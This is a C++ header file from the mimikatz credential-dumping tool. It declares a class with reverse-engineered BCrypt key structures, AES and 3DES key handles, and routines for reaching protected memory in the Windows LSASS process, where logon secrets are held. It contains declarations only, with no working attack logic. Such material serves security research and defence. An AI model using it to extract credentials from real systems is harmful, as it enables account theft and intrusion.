/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#pragma once
#include "../mod_mimikatz_sekurlsa.h"

class mod_mimikatz_sekurlsa_keys_nt6 {

private:
	static HMODULE hBCrypt;
	
	typedef struct _KIWI_BCRYPT_KEY_DATA {
		DWORD size;
		DWORD tag;
		DWORD type;
		DWORD unk0;
		DWORD unk1;
		DWORD unk2;
		DWORD unk3;
		PVOID unk4;
		BYTE data; /* etc... */
	} KIWI_BCRYPT_KEY_DATA, *PKIWI_BCRYPT_KEY_DATA;

	typedef struct _KIWI_BCRYPT_KEY {
		DWORD size;
		DWORD type;
		PVOID unk0;
		PKIWI_BCRYPT_KEY_DATA cle;
		PVOID unk1;
	} KIWI_BCRYPT_KEY, *PKIWI_BCRYPT_KEY;
	
	static PBYTE DES3Key, AESKey;
	static PKIWI_BCRYPT_KEY * hAesKey, * h3DesKey;
	static BCRYPT_ALG_HANDLE * hAesProvider, * h3DesProvider;

	static bool LsaInitializeProtectedMemory();
	static bool LsaCleanupProtectedMemory();

public:
	static bool searchAndInitLSASSData();
	static bool uninitLSASSData();
};
